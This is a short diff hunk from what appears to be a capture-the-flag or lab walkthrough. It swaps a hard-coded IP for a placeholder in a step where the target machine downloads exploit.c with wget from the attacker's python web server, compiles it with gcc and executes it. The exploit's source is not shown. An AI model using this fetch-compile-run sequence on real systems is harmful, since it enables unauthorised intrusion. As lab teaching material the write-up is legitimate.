@@ -119,7 +119,7 @@ python3  -m  http.server  8080
 On the target machine, get the expoit, compile it with gcc and execute it:
 
 ```bash
-wget  http://10.10.14.101:8080/exploit.c
+wget  http://$YourMachine_IP:8080/exploit.c
 
 gcc  exploit.c  -o  exploit
 
